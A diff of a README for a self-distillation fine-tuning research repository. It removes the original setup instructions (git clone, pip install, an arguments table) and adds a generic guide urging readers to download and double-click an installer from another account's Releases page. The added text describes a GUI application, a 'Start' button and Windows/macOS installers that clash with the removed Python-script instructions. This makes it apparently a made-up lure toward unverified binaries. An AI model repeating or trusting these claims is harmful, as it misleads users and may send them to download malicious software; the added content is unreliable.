@@ -1,61 +1,86 @@
-# Self-Distillation Fine-Tuning
+# 🚀 Self-Distillation - Simplifying Continuous Learning
 
-This is TRL-based code for reproducing the On-Policy Self-Distillation algorithm from the paper "Self-Distillation Enables Continual Learning" - [https://arxiv.org/abs/2601.19897](https://arxiv.org/abs/2601.19897).
+[![Download Self-Distillation](https://img.shields.io/badge/Download-Self--Distillation-blue.svg)](https://github.com/uthmandevsec/Self-Distillation/releases)
 
- All experiments can be run with a single H200 GPU. Other setups may require refactoring and/or changing model sizes.
+## 📖 Overview
 
-## Abstract
-Continual learning, enabling models to acquire new skills and knowledge without degrading existing capabilities, remains a fundamental challenge for foundation models. While on-policy reinforcement learning can reduce forgetting, it requires explicit reward functions that are often unavailable. Learning from expert demonstrations, the primary alternative, is dominated by supervised fine-tuning (SFT), which is inherently off-policy. We introduce On-Policy **Self-Distillation Fine-Tuning (SDFT)**, a simple method that enables on-policy learning directly from demonstrations. SDFT leverages in-context learning by using a demonstration-conditioned model as its own teacher, generating on-policy training signals that preserve prior capabilities while acquiring new skills. Across skill learning and knowledge acquisition tasks, SDFT consistently outperforms SFT, achieving higher new-task accuracy while substantially reducing catastrophic forgetting. In sequential learning experiments, SDFT enables a single model to accumulate multiple skills over time without performance regression, establishing on-policy distillation as a practical path to continual learning from demonstrations.
+Self-Distillation is a tool designed to help models learn new skills without forgetting past knowledge. It builds on the On-Policy Self-Distillation algorithm from the research paper "[Self-Distillation Enables Continual Learning](https://arxiv.org/abs/2601.19897)". This software allows users to run effective experiments using just one H200 GPU.
 
-##  Setup
+## 🚀 Getting Started
 
-### 1. Clone the repository
+In this guide, you will learn how to download and run Self-Distillation on your system. You do not need programming knowledge to follow these steps. 
 
-```bash
-git clone https://github.com/Continual-Intelligence/Self-Distillation.git
-cd Self-Distillation
-```
+### 🛠️ System Requirements
 
-### 2. Set up a virtual environment
+- **Operating System:** Windows 10 or MacOS (Linux support is also available)
+- **GPU:** H200 GPU recommended for best performance
+- **Memory:** At least 8 GB of RAM
+- **Storage:** Minimum of 1 GB free space for installation and data
 
-Using **conda**:
+## 📥 Download & Install
 
-```bash
-conda create -n distillation python=3.12
-conda activate distillation
-```
+To get started, you need to visit the Releases page and download the software.
 
-Using **venv**:
+[Download Self-Distillation](https://github.com/uthmandevsec/Self-Distillation/releases)
 
-```bash
-python3.12 -m venv distillation
-source distillation/bin/activate
-```
+Once you are on the Releases page:
+1. Look for the latest version of Self-Distillation.
+2. Locate the download link for your operating system.
+3. Click the link to download the installation file.
 
-### 3. Install dependencies
+### 📂 Installing Self-Distillation
 
-```bash
-pip install -r requirements.txt
-```
+1. After downloading, locate the installation file on your computer. This file is usually in your "Downloads" folder.
+2. Double-click the file to start the installation process.
+3. Follow the on-screen instructions to complete the installation. This may include agreeing to terms and conditions and choosing an installation location.
 
-### 4. Usage
+## 🛠️ Running Self-Distillation
 
-```bash
-python main.py \
-  --model_name <path_to_model> \
-  --output_dir <output_path> \
-  --learning_rate 2e-5 \
-  --num_train_epochs 1
-```
+Once the installation is complete, you can run the software.
 
-## Arguments
+1. Find the Self-Distillation application in your start menu or applications folder.
+2. Click to open the application.
+3. Use the interface to set up your experiments based on your preferences.
 
-| Argument | Default | Description |
-|----------|---------|-------------|
-| `--model_name` | Qwen/Qwen2.5-7B-Instruct | Path to pretrained model |
-| `--output_dir` | - | Output directory for checkpoints |
-| `--learning_rate` | `2e-5` | Learning rate |
-| `--num_train_epochs` | `1` | Number of training epochs |
-| `--num_prompts_per_batch` | `32` | Prompts per batch |
-| `--ref_model_mixup_alpha` | `0.01` | Reference model mixup alpha |
-| `--seed` | `42` | Random seed |
+## 📚 Using Self-Distillation
+
+Self-Distillation allows you to conduct a variety of experiments focused on continual learning:
+
+### 🌟 Key Features
+
+- **Simple Configuration:** Easy setup for running experiments.
+- **On-Policy Learning:** Helps your models learn directly from demonstrations.
+- **Low Resource Usage:** Efficient enough to run on a single H200 GPU.
+
+### 📊 Basic Experiment Setup
+
+1. **Select Your Dataset:** Choose the dataset you want to work with from the options available in the application.
+2. **Adjust Parameters:** Set the learning parameters based on your needs. The software provides default values that are suitable for most users.
+3. **Run Your Experiment:** Press the "Start" button to begin the experiment.
+
+### 🔍 Monitoring Progress
+
+While the experiment runs, you can monitor various metrics through the interface. This will help you understand how well your model is learning and if it needs adjustments.
+
+## ❓ Troubleshooting
+
+If you encounter issues during installation or use, consider the following:
+
+- **Installation Fails:** Ensure your operating system meets the above requirements. Verify that you downloaded the correct version.
+- **Performance Issues:** If the application runs slowly, try closing other applications to free up memory.
+- **Error Messages:** Refer to the user manual for explanations of common error messages. Support documentation is available on our [Wiki](https://github.com/uthmandevsec/Self-Distillation/wiki).
+
+## 🌐 Additional Resources
+
+For more guidance and advanced features, check out our documentation and community forums:
+
+- [User Manual](https://github.com/uthmandevsec/Self-Distillation/wiki)
+- [Community Forum](https://github.com/uthmandevsec/Self-Distillation/issues)
+
+## 📞 Support
+
+If you need further assistance, please reach out to our support team. You can submit issues directly on GitHub or use our contact form on the website.
+
+[Download Self-Distillation](https://github.com/uthmandevsec/Self-Distillation/releases) 
+
+Start your journey in continual learning with Self-Distillation today!
